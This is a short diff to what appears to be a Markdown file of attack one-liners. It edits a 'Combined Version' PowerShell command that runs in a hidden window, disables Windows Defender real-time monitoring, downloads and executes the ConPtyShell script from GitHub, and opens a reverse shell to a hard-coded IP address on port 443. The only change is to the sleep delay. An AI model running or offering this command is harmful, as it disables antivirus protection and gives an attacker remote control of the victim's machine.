@@ -43,7 +43,7 @@ powershell -w hidden {IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConP
 ```
 ### Combined Version - 
 ```
-powershell -w hidden {Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep -s 3; IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 40.71.97.253 443}
+powershell -w hidden {Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep -millisecond 1500; IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 40.71.97.253 443}
 ```
 
 
